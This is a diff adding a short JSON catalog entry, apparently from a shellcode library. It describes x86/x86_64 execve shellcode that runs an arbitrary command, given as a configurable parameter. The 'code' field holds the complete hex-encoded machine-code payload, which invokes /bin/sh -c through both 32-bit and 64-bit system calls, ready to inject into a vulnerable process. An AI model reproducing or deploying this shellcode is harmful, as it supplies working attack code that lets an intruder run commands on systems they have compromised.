@@ -1,0 +1,12 @@
+{
+	"description" : "x86/x86_64 execve shellcode, arbitrary command",
+	"author"      : "brainsmoke",
+	"parameters"  : [
+		{
+			"name"        : "command",
+			"type"        : "string",
+			"placeholder" : "beef"
+		}
+	],
+	"code" : "31db53682f62696e545f816f04d18c97ff6a2d545ec646016353545aeb265631c0488d770556546a3b79156a1958cd8085c0587902b00b59575b52515350cd80585e0f05e8d5ffffffbeef0a"
+}
